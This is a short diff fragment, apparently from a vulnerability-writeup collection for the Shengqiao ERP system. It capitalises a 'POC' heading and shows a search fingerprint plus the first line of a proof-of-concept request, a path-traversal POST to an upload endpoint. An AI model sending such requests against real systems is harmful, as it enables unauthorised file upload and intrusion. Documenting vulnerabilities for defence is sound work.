@@ -8,7 +8,7 @@
 title="圣乔ERP系统"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /erp/wap/../uploadFile.action HTTP/1.1
